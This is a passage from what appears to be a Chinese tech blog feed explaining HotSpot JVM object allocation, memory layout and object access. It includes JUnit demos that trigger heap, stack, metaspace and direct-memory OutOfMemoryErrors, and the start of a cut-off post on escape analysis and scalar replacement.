title="HotSpot虚拟机对象探秘"></a>HotSpot虚拟机对象探秘</h1><blockquote><p>这一章节我们讨论HotSpot虚拟机上Java堆中对象的分配，布局和访问的全过程</p></blockquote><h2 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h2><p>​        当虚拟机遇到一个字节码new指令时，会去检查这个指令的参数是否能在常量池中定位到一个类的符号引用，并检查这个类有没有加载，解析，初始化。如果没有则必须先加载类。</p><p>​        在一切准备工作完成后，虚拟机需要给新生对象分配内存空间，而该对象需要多大的空间在类的加载后就可以确定了，而为对象分配内存空间也就是把一块儿确认大小的内存块儿从堆空间中划分出来。这里有两种分配方式：</p><ol><li>假如堆中内存是绝对规整的，所有被使用的内存块儿放在一边，另一边是空闲的内存，中间放一个指针作为分界点。这样当需要新的空间时，只需要让指针平移与对象大小相等的距离，这种分配方式叫做指针碰撞。</li></ol><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hef3ssezj314g0f0dhy.jpg" alt="image-20220613222609748"></p><ol start="2"><li>如果堆中空间并不是规整的，被使用的区域和空闲区域交叉在一起，则不能只用指针碰撞，而只能维护一个列表，记录哪些内存块儿可用。在分配时在列表中找一个足够大的区域进行分配，并更新列表。</li></ol><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hef5d3lpj316m0k877d.jpg" alt="image-20220613223521549"></p><p>​        使用哪种分配方式是由堆是否规整决定的，而堆是否规整是由采用的垃圾回收器是否带有空加压缩整理的能力决定的。</p><blockquote><p>除了如何划分空间以外，还有一个问题，对象创建在虚拟机中是非常频繁的操作，在多线程下，仅修改指针指向位置有这<strong>线程安全问题</strong>，比方说正在给对象A分配空间，指针还没有移动，对象B又使用原来的指针修改了。</p></blockquote><p>​        这里有两种解决方案：</p><ol><li>对分配动作进行同步处理，而实际中的虚拟机采用CAS来保证原子性和安全性。</li><li>把内存分配动作按照线程划分在不同的地方，即每个线程提前在堆中间分配一块儿空间，称为本地线程分配缓冲(TLAB)，哪个线程要分配内存，就在哪个线程的本地缓冲区中分配，只有本地缓冲区用完了，需要分配新的空间时再进行同步操作。是否使用TLAB，可以通过-XX:+/-UseTLAB来设定。</li></ol><p>​        在内存分配完成后，虚拟机必须将分配到的内存空间都初始化为0值，保证了对象的实例字段在java代码中可以不赋初始值就能直接使用。</p><p>​        接下来，虚拟机还需要对对象进行必要的设置，例如：这个对象是哪个类的实例（你是谁家的？），如何找到类的元数据信息（你家在哪？），对象的Hash值是多少（你身份证号多少？），对象的GC分代年龄（你多大？成年没？）</p><p>​        上面工作做完后，从虚拟机的角度看，一个新的对象已经创建好了，但从Java程序来看，对象的创建才刚刚开始——构造函数。也就是Class文件的<init>()方法没有执行，所有的字段为默认的零值，一般来说new指令之后会接着执行<init>()方法，按照程序设定来完成。这样一个可用对象就完成了。</p><h2 id="对象的内存布局"><a href="#对象的内存布局" class="headerlink" title="对象的内存布局"></a>对象的内存布局</h2><p>​        在HotSpot虚拟机中，对象在堆的存储布局分为：<strong>对象头，实例数据，对齐填充</strong>。</p><ol><li>对象头有两类信息<ol><li>存储对象自身的运行时数据，例如：哈希值，GC年龄，锁状态等数据。在32和64位虚拟机中分别为32位个bit和64个bit，官方称为 <strong>Mark Word</strong> ，但对象运行时数据很多，超过了32,64位Bitmap所能记录的最大限度，但对象头内的数据是对象自身定义数据的额外成本，所以被设计成一种动态的数据结构。</li><li>另一部分为类型指针，也就是虚拟机根据该指针来确定该对象是哪个类的实例，此外如果是数组，还需要记录数组的长度。</li></ol></li><li>实例数据，这里就存放着对象自身定义和从父类继承下来的各种类型的字段。HotSpot虚拟机默认分配顺序为longs、doubles、ints、shorts、chars、bytes、booleans，可以发现相同宽度的字段放在一起，且父类定义的会放在子类之前。如果参数设置：+XX:CompactFields参数为true（默认为true），子类中比较小的变量也允许插入到父类变量的空隙中，节省空间。</li><li>对齐填充，仅仅起到占位的作用。由于HotSpot虚拟机的自动内存管理系统要求对象起始地址必须是8字节的整数倍，换句话说任何对象的大小都必须是8字节的整数倍。对象头部分已经被设计成了8字节的倍数。</li></ol><h2 id="对象的访问"><a href="#对象的访问" class="headerlink" title="对象的访问"></a>对象的访问</h2><p>​        Java程序会通过栈上的reference数据来操作堆上的具体对象，它只是一个指向对象的引用。所以对象的访问方式也是又具体的虚拟机实现的，主流的访问方式是使用句柄和直接指针两种。</p><ol><li>通过句柄<ol><li>好处：reference中存放的稳定句柄地址，对象被移动（垃圾回收）时只改变句柄中的实例数据指针。reference本身不变。</li></ol></li></ol><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hef4as1rj316k0rawhw.jpg" alt="image-20220614225930127"></p><ol start="2"><li>通过直接指针（默认）<ol><li>优点：一次访问，速度块</li></ol></li></ol><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hef30umij31680r8whn.jpg" alt="image-20220614230136856"></p><h1 id="实战：OutOfMemoryError异常"><a href="#实战：OutOfMemoryError异常" class="headerlink" title="实战：OutOfMemoryError异常"></a>实战：OutOfMemoryError异常</h1><p>​        在Java虚拟机规范中，除了程序计数器以外，其他区域都有发生内存溢出的可能，这一节通过代码验证各个运行时区域存储的内容，并且将初步介绍若干最基本的HotSpot虚拟机参数。</p><p>​        另外希望读者在实际工作中遇到内存异常时，能根据提示信息知道是哪个区域发生了异常，并且知道什么样的代码可能导致溢出。提示如果使用的控制台控制程序，直接在java后写参数即可，我这里使用的idea。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hef4z2owj31pj0u00y2.jpg" alt="image-20220615085843593"></p><h2 id="Java堆异常"><a href="#Java堆异常" class="headerlink" title="Java堆异常"></a>Java堆异常</h2><p>​        堆是存放对象实例的，所以当创建过多的对象并没有及时的GC掉就会挤满堆空间。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">HeapOOM</span>&#123;&#125;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * vm args: -Xms20m -Xmx20m -XX:+HeapDumpOnOutOfMemoryError</span></span><br><span class="line"><span class="comment">    * 限制java堆的大小为20MB，不可扩展</span></span><br><span class="line"><span class="comment">    * -XX:+HeapDumpOnOutOfMemoryError 可以让虚拟机出现内存溢出异常时</span></span><br><span class="line"><span class="comment">    * Dump出当时的内存堆转储快照以便进行事后分析</span></span><br><span class="line"><span class="comment">    * </span></span><br><span class="line"><span class="comment">    * java.lang.OutOfMemoryError: Java heap space</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@Test</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">heap</span><span class="params">()</span> &#123;</span><br><span class="line">       ArrayList&lt;HeapOOM&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">       <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">           list.add(<span class="keyword">new</span> <span class="title class_">HeapOOM</span>());</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>​        当出现<code>java.lang.OutOfMemoryError: Java heap space</code> 表示堆空间发生问题，要解决这个问题，我们需要分析映射出的<code>Dumping heap to java_pid753.hprof ...</code>文件。通过内存映像分析工具对Dump出来的堆转储快照进行分析。这里我们使用JProfiler来控制</p><ol><li><p>第一步确认到底是<code>内存溢出</code>还是<code>内存泄露</code>。</p><ol><li>内存溢出是指我无法申请到更多的空间</li><li>内存泄露是指我申请了空间，却无法释放已经申请的空间。</li></ol><blockquote><p>内存泄露  会导致  内存溢出</p></blockquote></li><li><p>如果是内存泄露，可以根据工具查看泄漏对象到GC Roots的引用链，什么原因导致无法被垃圾回收掉。</p></li><li><p>如果不是内存泄露，说明内存中的对象确实需要一存活，则应该检查-Xms -Xmx设置大小，看是否还可以多设置一些内存，再从代码上看，是否某些对象生命周期过长，存储结构不合理等。</p></li></ol><h2 id="虚拟机栈和本地方法栈溢出"><a href="#虚拟机栈和本地方法栈溢出" class="headerlink" title="虚拟机栈和本地方法栈溢出"></a>虚拟机栈和本地方法栈溢出</h2><p>​        在虚拟机中并不区分虚拟机栈和本地方法栈，只能通过<code>-Xss</code>参数化来设定，其中只有两种异常：</p><ol><li>栈深度大于虚拟机允许的最大深度：爆出StackOverflowError异常。</li><li>如果栈内存允许动态扩充，当无法再申请时爆出OOM。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 虚拟机栈中出现的异常分为，超出栈限制的最大深度，抛出StackOverFlowError</span></span><br><span class="line"><span class="comment">     * 如果允许栈内存动态拓展，则会在无法申请到更多内存时，抛出OOM</span></span><br><span class="line"><span class="comment">     * HotSpot虚拟机选择的是不支持扩展，所以多数是抛出StackOverFlowError</span></span><br><span class="line"><span class="comment">     * 在单线程下，可能会因为递归不断地插入新的栈帧而将栈挤爆</span></span><br><span class="line"><span class="comment">     * 在多线程下，也可能单个线程的栈还没有溢出，申请线程太多也会造成内存溢出OOM</span></span><br><span class="line"><span class="comment">     * vm args：-Xss限制栈内容量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">stack</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            stackLeak();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;stack length : &quot;</span>+stackLength);</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​        出现栈溢出还是比较好确定位置的。栈溢出的话我们可以采取扩容和尾递归优化等方法记性扩容，如果是多线程导致的内存溢出，且不能减少内存数量的情况，只能通过减少最大堆和减少栈容量来换取更多的线程。</p><h2 id="方法区和运行时常量池溢出"><a href="#方法区和运行时常量池溢出" class="headerlink" title="方法区和运行时常量池溢出"></a>方法区和运行时常量池溢出</h2><pre><code>     这里使用String.intern()方法来测试，该方法会先判断字符串是否在字符串常量池内，如果已经存在，则直接返回地址，如果没有则创建一对象，并返回地址。而在JDK6以前，字符串常量池是在永久代的，所以可以通过`-XX:PermSize -XX:MaxPermSize`来限制永久代的大小，即可间接限制字符串常量池的大小。运行结果为：OOME:PermGen space</code></pre><p>​        但在JDK7,8以后再使用该参数就没有用了，因为字符串常量池一定转移到堆中了，使用<code>-Xms</code>来控制堆的大小。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 在方法区和运行时常量池溢出</span></span><br><span class="line"><span class="comment">     * 通过String.inter()方法，该方法会先从字符串常量区寻找该对象，如果有直接返回，如果没有则创建并返回</span></span><br><span class="line"><span class="comment">     * JDK6以前 设置vm args：-XX:PermSize=6m -XX:MaxPermSize=6m 控制方法区大小 会爆出：OOM：PermGen space，</span></span><br><span class="line"><span class="comment">     * 说明这个时候的字符串常量池是在方法区中</span></span><br><span class="line"><span class="comment">     * JDK7以后 设置上述参数已经没有用了，字符串常量池被放在堆空间中，只能通过设置-Xmx参数限制堆大小可反应出来</span></span><br><span class="line"><span class="comment">     * vm args: -Xmx6m  爆出错误：OutOfMemoryError:GC overhead limit exceeded，这个代表当前已经没有可用内存了，经过多次GC之后仍然没有有效释放内存</span></span><br><span class="line"><span class="comment">     * -Xmx6m -XX:-UseGCOverheadLimit   爆出错误：OutOfMemoryError: Java heap space  说明字符串常量池已经转移到了堆空间中</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">permGenSpace</span><span class="params">()</span> &#123;</span><br><span class="line">        HashSet&lt;String&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            set.add(String.valueOf(i++).intern());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里还有一个面试题</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这个是String.intern()经典的问题</span></span><br><span class="line"><span class="comment">     * 当JDK6中得到的结果是两个false</span></span><br><span class="line"><span class="comment">     *      因为JDK6中 intern()方法将首次遇到的字符串实例复制到永久代的字符串常量池中存储，返回的也是字符串常量池的引用</span></span><br><span class="line"><span class="comment">     *      而StringBuilder创建的对象是在堆上面的，所有两者的地址当然不同</span></span><br><span class="line"><span class="comment">     * 而在JDK7中</span></span><br><span class="line"><span class="comment">     *      inter()方法就不需要再拷贝到字符串实例到常量池中了，字符串常量池已经在堆中了，只需要在字符串常量中记录一下实例引用就可以了</span></span><br><span class="line"><span class="comment">     *      而关于java的intern()爆出false，是因为在类加载的时候就有一个静态变量加入到字符串常量池了，所以后面再创建的就 不是同一个对象了</span></span><br><span class="line"><span class="comment">     *      System  ---&gt;  initializeSystemClass()  ---&gt;   sun.misc.Version.init();  其中Version类在加载的时候创建了一个静态变量</span></span><br><span class="line"><span class="comment">     *      private static final String launcher_name = &quot;java&quot;;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">stringInternTest</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;计算机&quot;</span>).append(<span class="string">&quot;软件&quot;</span>).toString();</span><br><span class="line">        System.out.println(str1 == str1.intern());</span><br><span class="line">        <span class="comment">//这里是直接在堆中创建了一个StringBuilder对象</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;ja&quot;</span>).append(<span class="string">&quot;va&quot;</span>);</span><br><span class="line">        <span class="comment">//去字符串常量池找是否有java，有则返回地址，没有则创建后放回</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">intern</span> <span class="operator">=</span> <span class="string">&quot;java&quot;</span>.intern();</span><br><span class="line">        <span class="comment">//这里是根据StringBuilder的值先去看字符串常量池是否有，有则返回，没有则创建</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> (String) builder.toString();</span><br><span class="line">        System.out.println(<span class="string">&quot;builder:&quot;</span>+builder.hashCode());</span><br><span class="line">        System.out.println(<span class="string">&quot;str:&quot;</span>+str2.hashCode());</span><br><span class="line">        System.out.println(<span class="string">&quot;or_str:&quot;</span>+intern.hashCode());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>方法区也是放置类型信息的地方，如果动态生成大量的类，也会导致方法区溢出</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 关于方法去的内存溢出，注意：JDK6及其以前，方法区也被承认永久代，因为hotspot团队将堆空间的分代思想来构造方法区</span></span><br><span class="line"><span class="comment">     * 这样，就不用在针对方法区构建代码了，但是后来从JDk7开始将一些内容从方法区中抽离，而JDK完全使用元空间来代替永久代</span></span><br><span class="line"><span class="comment">     * 而一般类加载信息就会放到这部分中，我们可以通过不断地加载新的类，造成OOM</span></span><br><span class="line"><span class="comment">     * 这一块儿我们使用动态代理不断地创建新的类，需要注意的是这里并非纯粹的实验，许多主流的框架例如Spring都会使用到动态代理</span></span><br><span class="line"><span class="comment">     * 来创建新的代理类，而增强类越多，方法区就要越大，这样需要注意可能导致方法区的OOM</span></span><br><span class="line"><span class="comment">     * JDK7使用  JDK8中该指令已经remove了</span></span><br><span class="line"><span class="comment">     * vm args: -XX:PermSize=10M -XX:MaxPermSize=10M</span></span><br><span class="line"><span class="comment">     * JKD8使用</span></span><br><span class="line"><span class="comment">     * -XX:MaxMetaspaceSize:设置元空间的最大值，默认是-1，即不限制</span></span><br><span class="line"><span class="comment">     * -XX:MetaspaceSize:指定元空间的初始空间大小，以字节为单位，当触及该值时，进行垃圾回收</span></span><br><span class="line"><span class="comment">     *      ，同时收集器对该值进行调整，如果释放大量空间则将该值降低，如果释放很少的话，则会在最大值下相应提升</span></span><br><span class="line"><span class="comment">     * -XX:MinMetaspaceFreeRatio:作用是在垃圾回收之后控制最小的元空间剩余容量的百分比，可减少因为元空间的不足导致的</span></span><br><span class="line"><span class="comment">     *      垃圾回收的频率</span></span><br><span class="line"><span class="comment">     * -XX:MaxMetaspaceFreeRatio:控制对最大的元空间剩余容量的百分比</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Exception in thread &quot;main&quot; java.lang.OutOfMemoryError: Metaspace</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodArea</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">Enhancer</span> <span class="variable">enhancer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Enhancer</span>();</span><br><span class="line">            enhancer.setSuperclass(OOMObject.class);</span><br><span class="line">            enhancer.setUseCache(<span class="literal">false</span>);</span><br><span class="line">            enhancer.setCallback(<span class="keyword">new</span> <span class="title class_">MethodInterceptor</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">intercept</span><span class="params">(Object o, Method method, Object[] objects, MethodProxy methodProxy)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="keyword">return</span> methodProxy.invokeSuper(objects,objects);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            enhancer.create();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OOMObject</span>&#123;&#125;</span><br></pre></td></tr></table></figure><h2 id="直接内存溢出"><a href="#直接内存溢出" class="headerlink" title="直接内存溢出"></a>直接内存溢出</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 直接内存，不属于运行时数据区，但这部分内存被频繁使用，而在JKD 1.4后加入了NIO</span></span><br><span class="line"><span class="comment">     * 它可以使用Native函数库直接分配堆外内存然后通过一个缓存在堆中的DirectByteBuffer对象</span></span><br><span class="line"><span class="comment">     * 作为这块儿内存的引用来操作，能显著的提高性能，因为避免了在Java堆和Native堆中来回的复制数据</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 容量可通过：-XX:MaxDirectMemorySize参数来设定大小，如果不设定默认使用java堆的最大值（-Xmx指定）</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * java.lang.OutOfMemoryError</span></span><br><span class="line"><span class="comment">     * at sun.misc.Unsafe.allocateMemory(Native Method)</span></span><br><span class="line"><span class="comment">     * at OOM_EXP.text.DirectMemory(text.java:148)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 由直接内存导致的内存溢出，明显特征是在Heap Dump文件中不会看见什么明显的异常情况</span></span><br><span class="line"><span class="comment">     * 如果发现内存溢出后的Dump文件很小，而程序中又间接的使用了DirectMemory（典型的间接使用就是Nio）</span></span><br><span class="line"><span class="comment">     * 那可以着重的检查直接内存方面的原因了</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">DirectMemory</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredFields()[<span class="number">0</span>];</span><br><span class="line">        unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) unsafeField.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            unsafe.allocateMemory(_1MB);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">_1MB</span> <span class="operator">=</span> <span class="number">1024</span>*<span class="number">1024</span>;</span><br></pre></td></tr></table></figure><p>​        由直接内存导致的内存溢出的一个明显的特征就是dump文件不会有明显异常情况，dump文件很小，如果程序中又使用了NIO，则需要重点关注。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​        现在我们已经知道虚拟机大概的划分，和各个区域存储什么信息，什么样的代码操作会导致，虽然Java中有垃圾回收，但如果不注意就会导致问题。</p>]]></content>
      
      
      <categories>
          
          <category> JVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内存溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>后端编译与优化</title>
      <link href="/2022/11/25/JVM/%E5%90%8E%E7%AB%AF%E7%BC%96%E8%AF%91%E4%B8%8E%E4%BC%98%E5%8C%96/"/>
      <url>/2022/11/25/JVM/%E5%90%8E%E7%AB%AF%E7%BC%96%E8%AF%91%E4%B8%8E%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="后端编译与优化"><a href="#后端编译与优化" class="headerlink" title="后端编译与优化"></a>后端编译与优化</h1><h2 id="编译器优化技术"><a href="#编译器优化技术" class="headerlink" title="编译器优化技术"></a>编译器优化技术</h2><h3 id="逃逸分析"><a href="#逃逸分析" class="headerlink" title="逃逸分析"></a>逃逸分析</h3><blockquote><p>逃逸分析本身不是直接进行优化的方法，而是一种为优化提供帮助的分析算法</p><p>逃逸分析的原理：</p><p>​        我们分析对象的动态作用域，如果对象创建在方法中，可能被外部方法所引用到，例如作为参数被外部方法进行调用，这叫做<code>方法逃逸</code>，</p><p>​        被外部线程所访问到，例如赋值给外部线程使用的变量中。称为<code>线程逃逸</code></p></blockquote><p>​        从不逃逸，方法逃逸，线程逃逸。称为对象从小到大的逃逸程度，我们因此也可以做不同的优化策略、</p><h4 id="栈上分配"><a href="#栈上分配" class="headerlink" title="栈上分配"></a>栈上分配</h4><p>​        大家都知道在java中，所有的对象都存储在堆空间中，随着存放 的对象越来越多，也就需要垃圾回收器来进行工作，而这一步也是非常消耗性能的，那这里就引出一个概念<code>栈上分配</code>，也就是当我们进行逃逸分析后，发现对象不存在<code>线程逃逸</code>，我们将对象存储在栈上，随着栈帧的插入与弹出，对象本身也跟着创建和销毁。</p><blockquote><p> 这里我们需要提醒两点：</p><ol><li><p>之前放在堆中，堆中对象是被各个线程共享的，只要有指针指向该对象的地址，就可以进行使用。但栈是线程独有的。所以栈上分配的第一点：<code>对象不会被线程共享，也叫做线程逃逸</code>。</p></li><li><p>如果对象被分配到栈上了，随着栈帧插入与弹出（也就是方法的调用与结束），变量会跟着创建和删除，那如果该变量被方法外所引用，比如被当做方法参数被其他方法进行调用。这也称为<code>方法逃逸</code></p></li></ol></blockquote><p>​        栈上分配支持：<code>方法逃逸</code>，不支持：<code>线程逃逸</code></p><h4 id="标量替换"><a href="#标量替换" class="headerlink" title="标量替换"></a>标量替换</h4><blockquote><p>这里的标量是指Java中基础变量，例如：<code>int,char,boolen,short,Refference</code>等，也就是变量不能再拆分为更小的元素，这就叫<code>标量</code>。</p><p>而当我们创建对象后，对象可以再被细分为各种标量的组合，该对象也叫做<code>聚合量</code></p></blockquote><p>​        面向过程编程的一个好处就是不用封装对象，效率更高，所以通过这一点，如果我们能分析出该对象只有一部分会被使用，且对象不会逃逸到方法体外，则我们不创建该对象，而是直接创建对象的标量，进行使用。下面我们来代码解释一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">  <span class="type">int</span> x;</span><br><span class="line">  <span class="type">int</span> y;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.x = x;</span><br><span class="line">    <span class="built_in">this</span>.y = y;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getX</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//没有优化前</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getValue</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="type">int</span> <span class="variable">XX</span> <span class="operator">=</span> x+<span class="number">2</span>;</span><br><span class="line">  <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(XX,<span class="number">42</span>);</span><br><span class="line">  <span class="keyword">return</span> person.getX();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//第一步：构造函数内联后的样子</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getValue</span><span class="params">(<span class="type">int</span> 